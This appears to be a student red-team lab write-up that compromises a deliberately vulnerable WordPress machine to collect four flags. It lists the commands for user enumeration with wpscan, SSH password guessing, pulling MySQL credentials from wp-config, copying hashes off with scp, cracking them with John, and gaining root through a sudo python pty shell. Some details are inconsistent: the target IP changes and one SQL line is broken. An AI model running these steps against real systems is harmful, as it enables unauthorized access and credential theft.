# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services


Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV 192.168.1.110 #
  
```

This scan identifies the services below as potential points of entry:
- Target 1
  - 22/tcp  OpenSSH 6.7p1 Debian 
  - 80/tcp  Apache https 2.4.1
  - 111/tcp rocbind 2-4 
  - 139/tcp netbios-ssn Samba smbd 
  - 445/tcp netbios-ssn Samba smbd 



The following vulnerabilities were identified on each target:
- Target 1
  - CWE-521 Weak user password
  - User Enumeration
  - Privilege Escalation  
  - Unsalted user password hash in MySql
  - Open Port 22 
  - wp-config in default location


### Exploitation


The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: b9bbcb33ellb80be759c4e844862482d
    - ** Exploit Used **
      - Wordpress scan to enumerate all users
      - wpscan --url http://192.168.1.110 --enumerate
    - After receiving information on users, we can then guess Michael's password with a brute force attack
      - ssh Michael@192.168.1.110
      - password: michael 
      - flag 1 found in var/www/html/
      - nano service.html
       
  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
    - **Exploit Used**
      - Same exploit as flag 1
      - ssh Michael@192.168.1.110
      - locate *flag*.txt 
      - cd /var/www
      - ls -l 
      - cat flag2.txt


    - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
      - Wordpress configuration and MySQL exploit
      - First, we located login details for the mysql database in the wp-config.php file
      - Flag 3 was then found in the wp_posts table
      - mysql -uroot -p
      - R@v3nSecurity
      - show databases;
      - use Wordpress;
      - show tables; 
      - select * wp_posts 


  - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
      - Privilege Escalation
      - Within the same database, we were able to locate 2 unsalted hashes for Michael and Steven
      - mysql -uroot -p
      - R@v3nSecurity
      - show databases;
      - use Wordpress;
      - show tables; 
      - select * from wp_user into hashes.txt
      - After saving the query into the hashes.txt file, we can then exfiltrate the file back onto our kali machine
      - scp -r Michael@192.168.1.110:/home/hashes.txt ~/.
      - We can then use John to crack the unsalted hashes after editing the file with nano
      - John hashes.txt
      - This reveals a password for Steven "pink84"
      - ssh steven@192.168.1.105
      - pink84 
      - To then create a interactive shell we use the following command
      - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
      - flag4 is then located in the root directory 
       
